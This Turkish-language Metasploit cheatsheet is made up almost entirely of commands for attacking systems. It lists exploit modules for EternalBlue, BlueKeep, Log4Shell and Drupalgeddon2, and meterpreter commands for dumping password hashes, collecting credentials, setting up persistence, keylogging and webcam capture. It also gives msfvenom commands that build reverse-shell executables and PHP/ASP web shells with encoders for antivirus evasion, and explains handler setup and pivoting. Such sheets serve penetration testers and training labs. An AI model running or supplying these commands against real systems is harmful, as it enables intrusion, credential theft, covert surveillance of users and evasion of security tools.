# Metasploit Framework Cheatsheet

## Başlatma ve Temel Kullanım

```bash
msfconsole                   # Metasploit konsolunu başlat
msfconsole -q                # Banner olmadan başlat
msfdb init                   # Veritabanını başlat
msfdb start                  # Veritabanını başlat (servis olarak)
```

## Temel Komutlar

```
help                         # Yardım menüsü
version                      # Sürüm bilgisi
exit / quit                  # Çıkış
db_status                    # Veritabanı bağlantı durumu
banner                       # Banner göster
```

## Modül Arama ve Seçim

```
search <anahtar_kelime>      # Modül ara
search type:exploit platform:windows smb
search cve:2017-0144         # CVE ile ara

use <modül_yolu>             # Modül seç
use exploit/windows/smb/ms17_010_eternalblue
use 0                        # Arama sonucundan indisle seç

info                         # Aktif modül hakkında bilgi
back                         # Bir önceki menüye dön
```

## Modül Seçenekleri

```
show options                 # Mevcut seçenekleri göster
show advanced                # Gelişmiş seçenekleri göster
show payloads                # Kullanılabilir payload'ları listele
show targets                 # Hedef platformları listele
show evasion                 # Atlatma seçenekleri

set <SEÇENEK> <değer>        # Seçenek ayarla
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

unset <SEÇENEK>              # Seçeneği kaldır
unset all                    # Tüm seçenekleri kaldır
setg <SEÇENEK> <değer>       # Global seçenek ayarla (tüm modüller için)
```

## Çalıştırma

```
run                          # Modülü çalıştır (auxiliary için)
exploit                      # Exploit çalıştır
exploit -j                   # Arka planda çalıştır (job)
exploit -z                   # Çalıştır ve session'a geçme
check                        # Hedefin savunmasız olup olmadığını kontrol et
```

## Session Yönetimi

```
sessions                     # Aktif session'ları listele
sessions -l                  # Ayrıntılı listele
sessions -i <id>             # Session'a bağlan
sessions -k <id>             # Session'ı kapat
sessions -K                  # Tüm session'ları kapat
sessions -u <id>             # Session'ı yükselt (Meterpreter'a)
background / bg              # Session'ı arka plana al (Meterpreter içinde)
Ctrl+Z                       # Session'ı arka plana al
```

## Meterpreter Komutları

### Sistem Bilgisi

```
sysinfo                      # Sistem bilgisi
getuid                       # Mevcut kullanıcı
getpid                       # Süreç ID
ps                           # Çalışan süreçleri listele
pwd                          # Mevcut dizin
ls / dir                     # Dizin listele
```

### Dosya Transferi

```
upload /yerel/dosya C:\\hedef\\dizin     # Dosya yükle
download C:\\hedef\\dosya /yerel/dizin   # Dosya indir
edit <dosya>                             # Dosya düzenle
cat <dosya>                              # Dosya içeriğini oku
```

### Shell ve Süreç

```
shell                        # Sistem shell'i aç
execute -f cmd.exe -i -H     # Gizli etkileşimli komut çalıştır
migrate <pid>                # Başka bir sürece geç
kill <pid>                   # Süreci öldür
```

### Ağ

```
ipconfig / ifconfig          # Ağ arayüzleri
route                        # Yönlendirme tablosu
portfwd add -l 8080 -p 80 -r <hedef>    # Port yönlendirme
portfwd delete -l 8080 -p 80 -r <hedef> # Port yönlendirme sil
```

### Yetki Yükseltme

```
getsystem                    # Sistem yetkisi almaya çalış
getprivs                     # Ayrıcalıkları listele
use priv                     # Priv uzantısını yükle
```

### Credential Toplama

```
hashdump                     # NTLM hash'leri çek
run post/windows/gather/credentials/credential_collector
run post/multi/gather/ssh_creds
```

### Kalıcılık

```
run post/windows/manage/persistence_exe STARTUP=SCHEDULER
run post/linux/manage/cron_persistence
```

### Ekran ve Keylog

```
screenshot                   # Ekran görüntüsü al
keyscan_start                # Keylogger başlat
keyscan_dump                 # Kaydedilen tuşları göster
keyscan_stop                 # Keylogger durdur
webcam_list                  # Web kameralarını listele
webcam_snap                  # Web kamerasından fotoğraf çek
```

## Pivoting

```
# Meterpreter session üzerinden ağ yönlendirmesi
run post/multi/manage/autoroute    # Otomatik route ekle
route add 10.0.0.0/8 <session_id>  # Manuel route
route print                        # Route tablosu

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# proxychains ile kullan
# /etc/proxychains.conf'a: socks5 127.0.0.1 1080
```

## Payload Oluşturma (msfvenom)

```bash
# Windows reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.py

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp

# Staged vs Stageless
# Staged:    windows/x64/meterpreter/reverse_tcp   (/ ile ayrılır)
# Stageless: windows/x64/meterpreter_reverse_tcp   (_ ile birleşir)

# Encoder kullanma (AV atlatma)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

## Yaygın Exploit'ler

```
# EternalBlue (MS17-010) – SMB
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <hedef>
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# BlueKeep (CVE-2019-0708) – RDP
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# Log4Shell (CVE-2021-44228)
use exploit/multi/http/log4shell_header_injection

# Drupal Drupalgeddon2
use exploit/unix/webapp/drupal_drupalgeddon2

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
```

## Handler (Dinleyici) Kurma

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j             # Arka planda çalıştır
```
